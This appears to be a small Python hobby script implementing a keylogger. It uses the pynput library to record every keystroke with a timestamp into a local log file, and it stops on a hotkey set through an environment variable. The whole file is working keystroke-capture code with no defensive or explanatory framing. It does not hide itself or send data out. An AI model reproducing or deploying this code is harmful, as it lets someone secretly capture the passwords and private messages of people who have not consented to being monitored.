import pynput.keyboard as keyboard
import datetime

from dotenv import load_dotenv
import os
load_dotenv()
env_key = os.getenv("HOT_KEY")

log_file = "logs/keylog.txt"


def on_hotkey():
    print("stopping...")
    listener.stop()


hotkey = keyboard.HotKey(
    keyboard.HotKey.parse(env_key), #when matched
    on_hotkey #execute
)


def on_press(key):
    hotkey.press(listener.canonical(key))
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        entry = f"{timestamp} = {key.char}"
    except:
        entry = f"{timestamp} = {key}"

    with open(log_file, "a") as f: #appende al file
        f.write(entry + "\n")

print("Keylogger running...")


def on_release(key):
    hotkey.release(listener.canonical(key))


listener = keyboard.Listener(on_press=on_press, 
                             on_release=on_release)
listener.start()
listener.join()

